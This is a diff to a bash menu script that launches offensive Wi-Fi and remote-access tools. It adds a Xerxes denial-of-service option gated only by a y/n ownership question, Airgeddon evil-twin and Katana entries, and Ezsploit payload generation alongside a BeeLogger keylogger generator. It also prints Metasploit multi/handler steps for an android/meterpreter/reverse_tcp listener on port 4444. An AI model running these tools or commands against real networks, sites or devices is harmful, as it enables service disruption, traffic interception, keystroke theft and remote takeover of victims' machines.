@@ -1,5 +1,5 @@
 #! /bin/bash
-VERSION=1.1
+VERSION=1.2
 function interface_selection
 {
 echo -e " 1) $WLANN"
@@ -122,7 +122,7 @@ clear
 	then
 		echo -e "------------------------------\e[1;31mTOOLS\e[0m------------------------------"
 		echo -e "\e[1;33m 1\e[0m) Wifi tools"
-		echo -e "\e[1;33m 2\e[0m) Keeloggers-Remote access"
+		echo -e "\e[1;33m 2\e[0m) Remote access"
 		echo -e "\e[1;33m00\e[0m) Main menu"
 		echo -e "\e[1;33m 0\e[0m) EXIT"
 		echo "Choose: "
@@ -146,9 +146,12 @@ clear
 				echo -e "\e[1;33m13\e[0m) KickThemOut        Kick clients out of your network"
 				echo -e "\e[1;33m14\e[0m) Ghost-Phisher      Fake AP,MITM,Session hijacking etc..."
 				echo -e "\e[1;33m15\e[0m) The Eye            Detects ARP poisoning DNS spoofing etc..."
-				echo -e "\e[1;33m16\e[0m) ShARP(problematic) Detects who is spoofing on your network"
+				echo -e "\e[1;33m16\e[0m) Xerxes             The most powerful DoS tool(CAUTION)"
+				#~ echo -e "\e[1;33m16\e[0m) ShARP(problematic) Detects who is spoofing on your network"
 				echo -e "\e[1;33m17\e[0m) Mdk3-master        Tries to lock / reboot AP and more..."
 				echo -e "\e[1;33m18\e[0m) Mdk3-master        Tries to reboot the AP and unlock the WPS lock"
+				echo -e "\e[1;33m19\e[0m) Katana Framework   Many penetration testing features"
+				echo -e "\e[1;33m20\e[0m) Airgeddon          Evil twin-WPA WPA2-WEP-WPS and more"
 				echo -e "\e[1;33m00\e[0m) Main menu"
 				echo -e "\e[1;33m 0\e[0m) EXIT"
 				echo -e "Choose: "
@@ -165,14 +168,36 @@ clear
 					wifite
 				elif [ "$APPP" = "3" ]
 				then
-					clear	
-					wifiphisher
+					clear
+					echo -e "Do you have 1 or 2 wireless interfaces?: "
+					read ONEORTWO
+					if [ "$ONEORTWO" = "1" ]
+					then
+						clear
+						echo -e "Note that with only 1 wireless interface, wifiphisher doesn't deauthenticate the AP."
+						sleep 1
+						echo -e ""
+						echo -e "Press \e[1;33many key\e[0m to continue"
+						read
+						clear
+						wifiphisher -nJ
+					else
+						clear
+						wifiphisher
+					fi
 				elif [ "$APPP" = "4" ]
 				then
-					clear	
-					cd /root/Zatacker
-					./ZT.sh
-					cd
+					if [ -d "/root/Zatacker" ]
+					then
+						clear	
+						cd /root/Zatacker
+						./ZT.sh
+						cd
+					else
+						echo -e "You have to install it manually since its not on github.Sorry."
+						sleep 4
+						exec bash "$0"
+					fi
 				elif [ "$APPP" = "5" ]
 				then
 					clear	
@@ -238,12 +263,30 @@ clear
 				elif [ "$APPP" = "16" ]
 				then
 					clear
-					echo -e "Enter the name of the interface you want to defend with: "
-					read -e NAMEINT
-					clear	
-					cd /root/shARP
-					./shARP.sh -d $NAMEINT
-					cd
+					echo -e "Do you own the site you want to DoS?(\e[1;33my\e[0m/\e[1;33mn\e[0m)"
+					read DOSTERM
+					if [ "$DOSTERM" = "y" ]
+					then
+
+						clear
+						echo -e "Enter your site(etc iownthissite.com): "
+						echo -e "(without www)"
+						read -e SITEDOS
+						Launching www.isitdownrightnow.com for $SITEDOS
+						sleep 4
+						xdg-open http://www.isitdownrightnow.com/"$SITEDOS".html
+						clear	
+						cd /root/xerxes
+						SITEDOSX=www.$SITEDOS
+						echo -e "Press \e[1;33many key\e[0m to start DoS on $SITEDOSX"
+						read
+						./xerxes $SITEDOSX 80
+					else
+						clear
+						echo -e "Then never try this."
+						sleep 3
+						exec bash "$0"
+					fi
 				elif [ "$APPP" = "17" ]
 				then
 					clear	
@@ -275,6 +318,16 @@ clear
 					read -e FPS
 					clear
 					xterm -e 'mdk3 $WLANNM x 0 -t $MDBSSID -n $MDESSID -s $FPS'		
+				elif [ "$APPP" = "19" ]
+				then
+					clear	
+					ktf.console
+				elif [ "$APPP" = "20" ]
+				then
+					clear	
+					cd airgeddon
+					./airgeddon.sh
+					cd
 				elif [ "$APPP" = "6" ]
 				then
 					clear	
@@ -348,8 +401,9 @@ clear
 			elif [ "$CATEG" = "2" ]
 			then
 				clear
-				echo -e "--------------------\e[1;31mKeyloggers-Remote access\e[0m---------------------"
-				echo -e "\e[1;33m 1\e[0m) BeeLogger		Generate keylogger to send to email"
+				echo -e "-------------------------\e[1;31mRemote access\e[0m---------------------------"
+				echo -e "\e[1;33m 1\e[0m) BeeLogger		Generate keylogger"
+				echo -e "\e[1;33m 2\e[0m) Ezsploit      Generate payloads for many platforms,listeners etc..."
 				echo -e "\e[1;33m00\e[0m) Main menu"
 				echo -e "\e[1;33m 0\e[0m) EXIT"
 				echo -e "Choose: "
@@ -359,6 +413,23 @@ clear
 					cd /root/BeeLogger
 					python bee.py
 					cd
+				elif [ "$KEYLOG" = "2" ]
+				then
+					clear
+					cd /root/ezsploit/
+					./ezsploit.sh
+					cd
+					echo -e "TUTORIAL AFTER GENERATION OF PAYLOAD"
+					echo -e "Open a new terminal and type:"
+					echo -e "msfconsole"
+					echo -e "use exploit/multi/handler"
+					echo -e "THIS DEPENDS ON THE PLAYLOAD TYPE. ETC FOR ANDROID IS: set payload android/meterpreter/reverse_tcp"
+					echo -e "set lhost <YOUR IP HERE>"
+					echo -e "set lport 4444"
+					echo -e "exploit"
+					echo -e "Press \e[1;33many key\e[0m to leave..."
+					read
+					exec bash "$0"
 				elif [ "$KEYLOG" = "00" ]
 				then
 					clear
